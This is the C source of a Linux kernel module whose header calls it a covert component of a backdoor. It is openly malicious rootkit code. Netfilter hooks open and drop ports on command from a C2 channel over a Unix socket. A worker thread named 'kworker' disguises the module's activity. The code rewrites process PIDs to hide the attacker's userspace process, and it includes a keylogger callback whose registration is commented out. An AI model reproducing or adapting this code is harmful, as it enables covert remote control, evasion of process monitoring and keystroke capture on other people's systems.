/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The covert module for complimenting the backdoor
 */

#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/pid_namespace.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/stop_machine.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/un.h>
#include <net/sock.h>

#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
#endif

struct service {
    struct socket* tls_socket;
    struct task_struct* read_thread;
};

struct nf_hook_ops nfhi;
struct nf_hook_ops nfho;
struct service* svc;
struct sock* nl_sk;

unsigned char* buffer;
u16* open_ports;
u16* closed_ports;
size_t open_port_count = 0;
size_t closed_port_count = 0;

int send_msg(struct socket* sock, unsigned char* buf, size_t len);
int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
int start_transmit(void);
int init_userspace_conn(void);
void UpdateChecksum(struct sk_buff* skb);
int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);

static struct notifier_block keysniffer_blk = {
        .notifier_call = keysniffer_cb,
};

//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char* us_keymap[][2] = {
        {NULL, NULL}, {"<ESC>", "<ESC>"}, {"1", "!"}, {"2", "@"}, // 0-3
        {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, // 4-7
        {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, // 8-11
        {"-", "<"}, {"=", "+"}, {"<BACKSPACE>", "<BACKSPACE>"}, // 12-14
        {"<TAB>", "<TAB>"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"},
        {"u", "U"}, {"i", "I"}, // 20-23
        {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, // 24-27
        {"<ENTER>", "<ENTER>"}, {"<LCTRL>", "<LCTRL>"}, {"a", "A"}, {"s", "S"}, // 28-31
        {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, // 32-35
        {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, // 36-39
        {"'", "\""}, {"`", "~"}, {"<LSHIFT>", "<LSHIFT>"}, {"\\", "|"}, // 40-43
        {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, // 44-47
        {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, // 48-51
        {".", ">"}, {"/", "?"}, {"<RSHIFT>", "<RSHIFT>"}, {"<PRTSCR>", "<KPD*>"},
        {"<LALT>", "<LALT>"}, {"<SPACE>", "<SPACE>"}, {"<CAPS>", "<CAPS>"}, {"F1", "F1"},
        {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, // 60-63
        {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, // 64-67
        {"F10", "F10"}, {"<NUM>", "<NUM>"}, {"<SCROLL>", "<SCROLL>"}, // 68-70
        {"<KPD7>", "<HOME>"}, {"<KPD8>", "<UP>"}, {"<KPD9>", "<PGUP>"}, // 71-73
        {"-", "-"}, {"<KPD4>", "<LEFT>"}, {"<KPD5>", "<KPD5>"}, // 74-76
        {"<KPD6>", "<RIGHT>"}, {"+", "+"}, {"<KPD1>", "<END>"}, // 77-79
        {"<KPD2>", "<DOWN>"}, {"<KPD3>", "<PGDN"}, {"<KPD0>", "<INS>"}, // 80-82
        {"<KPD.>", "<DEL>"}, {"<SYSRQ>", "<SYSRQ>"}, {NULL, NULL}, // 83-85
        {NULL, NULL}, {"F11", "F11"}, {"F12", "F12"}, {NULL, NULL}, // 86-89
        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
        {"<KPENTER>", "<KPENTER>"}, {"<RCTRL>", "<RCTRL>"}, {"/", "/"}, {"<PRTSCR>", "<PRTSCR>"},
        {"<RALT>", "<RALT>"}, {NULL, NULL}, // 99-101
        {"<HOME>", "<HOME>"}, {"<UP>", "<UP>"}, {"<PGUP>", "<PGUP>"}, // 102-104
        {"<LEFT>", "<LEFT>"}, {"<RIGHT>", "<RIGHT>"}, {"<END>", "<END>"}, {"<DOWN>", "<DOWN>"},
        {"<PGDN", "<PGDN"}, {"<INS>", "<INS>"}, // 108-110
        {"<DEL>", "<DEL>"}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 111-114
        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 115-118
        {"<PAUSE>", "<PAUSE>"}, // 119
};

/*
 * function:
 *    UpdateChecksum
 *
 * return:
 *    void
 *
 * parameters:
 *    struct sk_buff* skb
 *
 * notes:
 * Recalculates the checksum of the packet after it has been modified.
 */
void UpdateChecksum(struct sk_buff* skb) {
    struct iphdr* ip_header = ip_hdr(skb);
    skb->ip_summed = CHECKSUM_NONE; //stop offloading
    skb->csum_valid = 0;
    ip_header->check = 0;
    ip_header->check = ip_fast_csum((u8*) ip_header, ip_header->ihl);

    if ((ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP)) {
        if (skb_is_nonlinear(skb)) {
            skb_linearize(skb);
        }

        if (ip_header->protocol == IPPROTO_TCP) {
            unsigned int tcplen;
            struct tcphdr* tcpHdr = tcp_hdr(skb);

            skb->csum = 0;
            tcplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            tcpHdr->check = 0;
            tcpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, tcplen,
                    IPPROTO_TCP, csum_partial((char*) tcpHdr, tcplen, 0));
        } else if (ip_header->protocol == IPPROTO_UDP) {
            unsigned int udplen;

            struct udphdr* udpHdr = udp_hdr(skb);
            skb->csum = 0;
            udplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            udpHdr->check = 0;
            udpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, udplen,
                    IPPROTO_UDP, csum_partial((char*) udpHdr, udplen, 0));
        }
    }
}

/*
 * function:
 *    recv_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel API
 */
int recv_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size = 0;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);

    return size;
}

/*
 * function:
 *    send_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel api
 */
int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_sendmsg(sock, &msg, &iov, 1, len);

    return size;
}

/*
 * function:
 *    read_TLS
 *
 * return:
 *    int
 *
 * notes:
 * Handler for reading and writing kernel module commands relating to firewall
 */
int read_TLS(void) {
    int len;
    u16 tmp_port;
    const char* bad_len = "Invalid command length\n";
    const char* bad_port = "Invalid port number\n";
    const char* open = "Port is now open\n";
    const char* close = "Port is now closed\n";
    const char* unknown = "Unknown command\n";
    const char* clear = "All port settings cleared\n";
    const char* bad_drop = "Unable to close the C2 port\n";
    struct task_struct *ts;
    char proc_name[TASK_COMM_LEN];
    struct pid* newpid;
    int z = 0;

    while (!kthread_should_stop()) {
        tmp_port = 0;
        memset(buffer, 0, MAX_PAYLOAD);
        len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
        printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
        if (len < 5) {
            strcpy(buffer, bad_len);
            send_msg(svc->tls_socket, buffer, strlen(bad_len));
            continue;
        }
        if (memcmp("open ", buffer, 5) == 0) {
            //Open a port
            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
                strcpy(buffer, bad_port);
                send_msg(svc->tls_socket, buffer, strlen(bad_port));
                continue;
            }
            open_ports[open_port_count++] = tmp_port;
            strcpy(buffer, open);
            send_msg(svc->tls_socket, buffer, strlen(open));
        } else if (memcmp("close ", buffer, 6) == 0) {
            //Close a port
            if (kstrtou16(buffer + 6, 10, &tmp_port)) {
                strcpy(buffer, bad_port);
                send_msg(svc->tls_socket, buffer, strlen(bad_port));
                continue;
            }
            if (tmp_port == PORT) {
                strcpy(buffer, bad_drop);
                send_msg(svc->tls_socket, buffer, strlen(bad_drop));
                continue;
            }
            closed_ports[closed_port_count++] = tmp_port;
            strcpy(buffer, close);
            send_msg(svc->tls_socket, buffer, strlen(close));
        } else if (memcmp("clear", buffer, 5) == 0) {
            open_port_count = 0;
            closed_port_count = 0;
            strcpy(buffer, clear);
            send_msg(svc->tls_socket, buffer, strlen(clear));
        } else if (memcmp("test", buffer, 4) == 0) {
            for_each_process(ts) {
                printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
                //if (strcmp("userspace.elf", proc_name) == 0) {
                if (strcmp("/usr/lib/system", proc_name) == 0) {
                    printk(KERN_INFO "Found my userspace proc\n");

                    //stop_machine(my_change_pid, ts, NULL);
                    newpid = get_task_pid(ts, PIDTYPE_PID);
                    //newpid->numbers[0].nr = 76831 + z++;
                    newpid->numbers[0].nr = 76831;
                } else if (strcmp("crash_test_dumm", proc_name) == 0) {
                    newpid = get_task_pid(ts, PIDTYPE_PID);
                    newpid->numbers[0].nr = 76831;
                }
            }
        } else {
            strcpy(buffer, unknown);
            send_msg(svc->tls_socket, buffer, strlen(unknown));
        }
    }
    return 0;
}

/*
 * function:
 *    init_userspace_conn
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Initializes the userspace connections needed.
 * Establishes tls socket with userspace.
 */
int init_userspace_conn(void) {
    int error;
    struct sockaddr_un sun;

    //TLS socket
    error = sock_create(AF_UNIX, SOCK_STREAM, 0, &svc->tls_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, UNIX_SOCK_PATH);

    error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }

    return 0;
}

/*
 * function:
 *    incoming hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for incoming packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

/*
 * function:
 *    outgoing_hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for outgoing packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param* param = _param;
    const char* keycode = NULL;

    /* Trace only when a key is pressed down */
    if (!(param->down)) {
        return NOTIFY_OK;
    }

    //119 is the highest keycode we can translate
    if (param->value <= 119) {
        keycode = us_keymap[param->value][param->shift];
    } else {
        return NOTIFY_OK;
    }
    // Unmapped keycode
    if (!keycode) {
        return NOTIFY_OK;
    }

    printk(KERN_INFO "Keycode: %s\n", keycode);

    return NOTIFY_OK;
}

static asmlinkage void (*change_pidR)(
        struct task_struct* task, enum pid_type type, struct pid* pid);
static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);

int my_change_pid(void* data) {
#if 0
    struct task_struct* ts = data;
    struct pid *newpid = get_task_pid(ts, PIDTYPE_PID);
    newpid->numbers[0].nr = 76831;
#endif
    return 0;
}

/*
 * function:
 *    mod_init
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Module entry function
 */
static int __init mod_init(void) {
    int err;
    struct task_struct* ts;
    char proc_name[TASK_COMM_LEN];
    struct pid* newpid;

    change_pidR = kallsyms_lookup_name("change_pid");
    alloc_pidR = kallsyms_lookup_name("alloc_pid");

    nfhi.hook = incoming_hook;
    nfhi.hooknum = NF_INET_LOCAL_IN;
    nfhi.pf = PF_INET;
    //Set hook highest priority
    nfhi.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfhi);

    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
    nfho.hook = outgoing_hook;
    nfho.hooknum = NF_INET_LOCAL_OUT;

    nf_register_net_hook(&init_net, &nfho);

    svc = kmalloc(sizeof(struct service), GFP_KERNEL);
    if ((err = init_userspace_conn()) < 0) {
        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
        kfree(svc);

        nf_unregister_net_hook(&init_net, &nfho);
        nf_unregister_net_hook(&init_net, &nfhi);

        return err;
    }
    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
    open_ports = kmalloc(2 * 65536, GFP_KERNEL);
    closed_ports = kmalloc(2 * 65536, GFP_KERNEL);

    svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
    printk(KERN_ALERT "backdoor module loaded\n");

    for_each_process(ts) {
        printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
        if (strcmp("userspace.elf", proc_name) == 0) {
            printk(KERN_INFO "Found my userspace proc\n");

#if 0
            write_lock(&tasklist_lock);

            //newpid = alloc_pidR(task_active_pid_ns(ts));
            newpid = get_task_pid(ts, PIDTYPE_PID);
            newpid->numbers[0].nr = 76831;
            //newpid->numbers[0].ns = task_active_pid_ns(ts);
            //change_pidR(ts, PIDTYPE_PID, newpid);

            write_unlock(&tasklist_lock);
#else
            stop_machine(my_change_pid, ts, NULL);
#endif
        }
    }

    //register_keyboard_notifier(&keysniffer_blk);

    return 0;
}

/*
 * function:
 *    mod_exit
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Module exit function
 */
static void __exit mod_exit(void) {
    nf_unregister_net_hook(&init_net, &nfho);
    nf_unregister_net_hook(&init_net, &nfhi);

    if (svc) {
        if (svc->tls_socket) {
            sock_release(svc->tls_socket);
            printk(KERN_INFO "release tls_socket\n");
        }
        kfree(svc);
    }

    if (buffer) {
        kfree(buffer);
    }
    if (open_ports) {
        kfree(open_ports);
    }
    if (closed_ports) {
        kfree(closed_ports);
    }
    //unregister_keyboard_notifier(&keysniffer_blk);
    printk(KERN_ALERT "removed backdoor module\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_DESCRIPTION("Kernel based networking hub");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Agapeyev <jagapeyev@gmail.com>");
